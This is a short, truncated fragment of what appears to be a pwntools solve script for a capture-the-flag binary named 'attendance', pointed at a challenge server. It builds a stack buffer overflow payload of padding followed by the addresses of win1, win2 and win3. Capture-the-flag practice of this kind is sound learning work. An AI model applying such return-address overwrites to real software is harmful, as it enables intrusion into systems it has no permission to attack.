...
#---------------------Common Settings---------------------#
bin_path = './attendance' # put the executable name here
local_libc_path = './libc.so.6'
remote_url = 'chal.firebird.sh'
remote_port =  35034 # remember to change the port here
...
def do_pwn(io: process | remote) -> None:
    ...
    def exploit() -> None:
        payload = flat(
            b'A'*0x68,
            p64(elf.symbols['win1']),
            p64(elf.symbols['win2']),
            p64(elf.symbols['win3']),
